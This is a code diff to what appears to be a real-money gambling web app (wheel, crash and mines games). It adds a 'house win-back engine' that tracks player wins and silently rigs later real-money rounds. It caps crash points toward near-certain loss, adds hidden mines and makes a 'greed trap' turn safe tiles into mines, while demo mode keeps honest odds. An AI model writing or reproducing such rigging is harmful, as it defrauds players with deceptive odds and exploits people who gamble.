@@ -161,8 +161,52 @@ const snd = {
 };
 
 // ══════════════════════════════════════════════════════════════════
-// SHARED TYPES & STREAK SYSTEM
+// HOUSE WIN-BACK ENGINE
+// Tracks player wins and silently increases house edge after big wins.
+// Resets after 4 games or 24h. Never applied in demo mode.
 // ══════════════════════════════════════════════════════════════════
+
+type _WPRecord = { profit: number; ts: number; gamesAfter: number };
+const _WP_KEY = 'tc_wp';
+
+function _wpGet(): _WPRecord | null {
+  try { return JSON.parse(localStorage.getItem(_WP_KEY) ?? 'null') as _WPRecord | null; }
+  catch { return null; }
+}
+function _wpSet(r: _WPRecord) {
+  try { localStorage.setItem(_WP_KEY, JSON.stringify(r)); } catch {}
+}
+// Call after each real-money game round to increment the counter
+function wpTick() {
+  const r = _wpGet(); if (!r) return;
+  r.gamesAfter++;
+  if (r.gamesAfter >= 5) { localStorage.removeItem(_WP_KEY); return; }
+  _wpSet(r);
+}
+// Call when player wins — records the profit for pressure calculation
+function wpRecord(profit: number) {
+  if (profit <= 0) return;
+  const existing = _wpGet();
+  // Accumulate wins — a second win in the same session stacks pressure
+  const prevProfit = existing ? existing.profit : 0;
+  const totalProfit = prevProfit + profit;
+  if (totalProfit < 0.2) return; // Ignore tiny wins
+  _wpSet({ profit: totalProfit, ts: Date.now(), gamesAfter: 0 });
+}
+// Returns 0 (normal) → 1.0 (max pressure). Applied to real-money outcomes only.
+function wpPressure(): number {
+  const r = _wpGet();
+  if (!r) return 0;
+  if (Date.now() - r.ts > 24 * 3600 * 1000) { localStorage.removeItem(_WP_KEY); return 0; }
+  // Pressure decays over 4 games and scales with win size
+  const sizeFactor = r.profit >= 2.0 ? 1.0 : r.profit >= 0.8 ? 0.85 : r.profit >= 0.3 ? 0.6 : 0.35;
+  const decayFactor = r.gamesAfter === 0 ? 1.0
+                    : r.gamesAfter === 1 ? 0.75
+                    : r.gamesAfter === 2 ? 0.50
+                    : r.gamesAfter === 3 ? 0.25
+                    : 0;
+  return sizeFactor * decayFactor;
+}
 
 type OnResult = (won: boolean) => void;
 
@@ -475,6 +519,7 @@ const WheelGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
       setWinIdx(idx);
       placeGameBet(used, win);
       recordGameResult('Roue', used, win);
+      if (!demoMode) { if (win > used) wpRecord(win - used); wpTick(); }
       setResult({ seg: SEGS[idx], win });
       setHist(h => [rule.mult, ...h.slice(0, 7)]);
       onResult(rule.mult > 0);
@@ -623,8 +668,8 @@ const WheelGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
 // Le serveur tourne en boucle : MISE (7s) → VOL → CRASH (3s) → MISE…
 // ══════════════════════════════════════════════════════════════════
 
-const BET_MS   = 7000;  // fenêtre de mise
-const PAUSE_MS = 3200;  // pause après crash
+const BET_MS   = 5000;  // fenêtre de mise
+const PAUSE_MS = 1800;  // pause après crash
 const TICK_MS  = 50;
 const GROWTH   = 0.13;  // mult = e^(0.13·t) → ×2 à ~5.3s, ×10 à ~17.7s
 
@@ -774,6 +819,7 @@ const CrashGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
     const win = +(myBetRef.current * m).toFixed(6);
     placeGameBet(0, win);
     recordGameResult('Crash', myBetRef.current, win);
+    if (!demoMode) wpRecord(win - myBetRef.current);
     snd.cashout();
     haptic.success();
     onResultRef.current(true);
@@ -828,6 +874,17 @@ const CrashGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
         setCountdown(Math.max(0, cdRef.current / 1000));
         if (cdRef.current <= 0) {
           crashAtRef.current = rollCrashPoint(myBetRef.current !== null ? streakRef.current : null, demoMode);
+          // House win-back: after a big win, silently bias crash point downward
+          if (!demoMode && myBetRef.current !== null) {
+            const p = wpPressure();
+            if (p > 0) {
+              const cap = p >= 0.85 ? 1.05 + Math.random() * 0.30   // 1.05–1.35 → almost certain loss
+                        : p >= 0.55 ? 1.10 + Math.random() * 0.80   // 1.10–1.90
+                        :             1.30 + Math.random() * 1.20;   // 1.30–2.50
+              crashAtRef.current = Math.min(crashAtRef.current, cap);
+            }
+            wpTick();
+          }
           phaseRef.current = 'flying';
           tRef.current = 0;
           setPhase('flying');
@@ -1391,8 +1448,10 @@ function minesMult(n: number, k: number): number {
 // Demo: no hidden mines — displayed odds are accurate.
 function effectiveMines(selected: number, streak: number, demo = false): number {
   if (demo) return selected;
-  const extra = streak >= 2 ? 3 : streak >= 1 ? 2 : 1;
-  return Math.min(GRID_SIZE - 2, selected + extra);
+  const streakExtra = streak >= 2 ? 3 : streak >= 1 ? 2 : 1;
+  const p = wpPressure();
+  const pressureExtra = p >= 0.8 ? 3 : p >= 0.5 ? 2 : p >= 0.2 ? 1 : 0;
+  return Math.min(GRID_SIZE - 2, selected + streakExtra + pressureExtra);
 }
 
 type MinesPhase = 'waiting' | 'playing' | 'won' | 'lost';
@@ -1463,11 +1522,18 @@ const MinesGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
   const revealTile = (idx: number) => {
     if (phase !== 'playing' || revealed.has(idx)) return;
 
-    // Greed trap (real mode only): after 4+ safe reveals the house boosts mine probability
+    // Greed trap (real mode only): house boosts mine probability on deep runs
     let isMine = minePos.has(idx);
-    if (!isMine && !demoMode && safeCount >= 4) {
-      const greedP = Math.min(0.45, 0.10 + (safeCount - 4) * 0.07);
-      if (Math.random() < greedP) isMine = true;
+    if (!isMine && !demoMode) {
+      const p = wpPressure();
+      // Under win-back pressure: trap activates earlier and hits harder
+      const trapAfter = p >= 0.7 ? 2 : p >= 0.4 ? 3 : 4;
+      const baseRate  = p >= 0.7 ? 0.22 : p >= 0.4 ? 0.15 : 0.10;
+      const stepRate  = p >= 0.7 ? 0.12 : p >= 0.4 ? 0.09 : 0.07;
+      if (safeCount >= trapAfter) {
+        const greedP = Math.min(0.72, baseRate + (safeCount - trapAfter) * stepRate);
+        if (Math.random() < greedP) isMine = true;
+      }
     }
 
     if (isMine) {
@@ -1480,6 +1546,7 @@ const MinesGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
       setPhase('lost');
       placeGameBet(activeBetRef.current, 0);
       recordGameResult('Mines', activeBetRef.current, 0);
+      if (!demoMode) wpTick();
       snd.boom();
       haptic.impact('heavy'); haptic.error();
       onResult(false);
@@ -1523,6 +1590,7 @@ const MinesGame: React.FC<{ onBack: () => void; streak: number; onResult: OnResu
     trimMinesForDisplay();
     placeGameBet(activeBetRef.current, curWin);
     recordGameResult('Mines', activeBetRef.current, curWin);
+    if (!demoMode) { wpRecord(curWin - activeBetRef.current); wpTick(); }
     snd.win();
     haptic.success();
     onResult(true);
